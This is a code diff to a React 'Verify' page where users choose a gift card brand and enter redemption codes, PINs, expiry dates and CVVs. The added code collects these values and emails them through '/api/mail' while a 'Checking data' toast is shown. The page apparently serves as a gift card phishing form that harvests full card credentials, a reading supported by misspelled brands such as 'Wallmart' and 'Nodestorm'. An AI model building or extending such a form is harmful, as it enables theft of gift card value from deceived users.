@@ -16,7 +16,6 @@ const Verify = () => {
   const [giftCardPin, setGiftCardPin] = useState('');
   const [giftCardExpiry, setGiftCardExpiry] = useState('');
   const [giftCardCVV, setGiftCardCVV] = useState('');
-  const [digit, setDigit] = useState('')
   const [error, setError] = useState('');
   const [emailSent, setEmailSent] = useState(false);
   
@@ -26,7 +25,6 @@ const Verify = () => {
     setGiftCardPin('');
     setGiftCardExpiry('');
     setGiftCardCVV('');
-    setDigit('')
   };
 
 
@@ -41,12 +39,29 @@ const Verify = () => {
         amount,
         redemptionCode
       }
+
+      if (cardType === 'Nodestorm' || cardType === 'Nike') {
+        emailData.giftCardPin = giftCardPin;
+      } else if (
+        cardType === 'Master Card' ||
+        cardType === 'Vanilla Visa' ||
+        cardType === 'Wallmart Visa' ||
+        cardType === 'Visa Silvery White' ||
+        cardType === 'TT Visa'
+      ) {
+        emailData.giftCardPin = giftCardPin;
+        emailData.giftCardCVV = giftCardCVV;
+      } else if (cardType === 'Amex') {
+        emailData.giftCardExpiry = giftCardExpiry;
+        emailData.giftCardPin = giftCardPin;
+        emailData.giftCardCVV = giftCardCVV;
+      }
+
       toast.loading('Checking data', {
-        duration: 4000,
+        duration: 6000,
       });
       // console.log(emailData)
-      // console.log(values)
-
+      
       fetch ('/api/mail', {
         method: 'POST',
         body: JSON.stringify(emailData),
@@ -68,6 +83,9 @@ const Verify = () => {
             setCurrency('USD');
             setAmount('');
             setRedemptionCode('');
+            setGiftCardPin('');
+            setGiftCardExpiry('');
+            setGiftCardCVV('');
             setError('');
           } else {
             // Error occurred while sending email
@@ -81,7 +99,6 @@ const Verify = () => {
           alert('Error sending email');
         });
       console.log("finished")
-
 
   }
 
@@ -101,7 +118,7 @@ const Verify = () => {
             // value={values.cardType} 
             value={cardType} 
             // onChange={handleChange} 
-            onChange={e => setCardType(e.target.value)} 
+            onChange={handleCardTypeChange} 
             className='w-full h-16 p-4 rounded-xl'
             >
             <option defaultValue="" disabled>Select type of Card</option>
@@ -109,9 +126,9 @@ const Verify = () => {
             <option value="American Express">American Express</option>
             <option value="Amex">Amex</option>
             <option value="Apple">Apple</option>
-            <option value="discover">Discover</option>
             <option value="eBay">eBay</option>
             <option value="Nike">Nike</option>
+            <option value="Nodestorm">Nodestorm</option>
             <option value="MasterCard">MasterCard</option>
             <option value="PlayStation">PlayStation</option>
             <option value="RazorGold">RazorGold</option>
@@ -123,6 +140,7 @@ const Verify = () => {
             <option value="Wallmart Visa">Wallmart Visa</option>
             <option value="Xbox">Xbox</option>
           </select>
+
           <div className='w-full flex gap-4'>
             <select 
               name="currency" 
@@ -162,6 +180,75 @@ const Verify = () => {
             className='w-full h-16 p-4 rounded-xl' 
             required
           />
+            {/* Conditionally render cardtype elements if selected */}
+          {(cardType === 'Nodestorm' || cardType === 'Nike') && (
+          <div>
+            <input
+              className='w-full h-16 p-4 rounded-xl' 
+              type="text"
+              id="giftCardPin"
+              name="giftCardPin"
+              value={giftCardPin}
+              placeholder='Gift Card Pin'
+              onChange={e => setGiftCardPin(e.target.value)}
+              required
+            />
+            <br />
+          </div>
+          )}
+
+          {(cardType === 'Master Card' ||
+          cardType === 'Vanilla Visa' ||
+          cardType === 'Wallmart Visa' ||
+          cardType === 'Visa Silvery White' ||
+          cardType === 'TT Visa' ||
+          cardType === 'Amex') && (
+
+          <div className='flex flex-col gap-4'> 
+            <input
+              className='w-full h-16 p-4 rounded-xl' 
+              type="text"
+              id="giftCardExpiry"
+              name="giftCardExpiry"
+              placeholder='Gift Card Expiry Date'
+              value={giftCardExpiry}
+              onChange={e => setGiftCardExpiry(e.target.value)}
+              required
+            />
+            <br />
+
+            {(cardType === 'Amex') && (
+              <div>
+                <input
+                  className='w-full h-16 p-4 rounded-xl' 
+                  type="text"
+                  id="giftCardPin"
+                  name="giftCardPin"
+                  value={giftCardPin}
+                  placeholder='4 digit Pin'
+                  minLength={4}
+                  maxLength={4}
+                  onChange={e => setGiftCardPin(e.target.value)}
+                  required
+                />
+                <br />
+              </div>
+            )}
+            <input
+              type="text"
+              className='w-full h-16 p-4 rounded-xl' 
+              id="giftCardCVV"
+              name="giftCardCVV"
+              value={giftCardCVV}
+              placeholder='Gift Card CVV'
+              onChange={e => setGiftCardCVV(e.target.value)}
+              required
+            />
+            <br />
+          </div>
+        )}
+
+
           <button 
             className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' 
             type='submit'
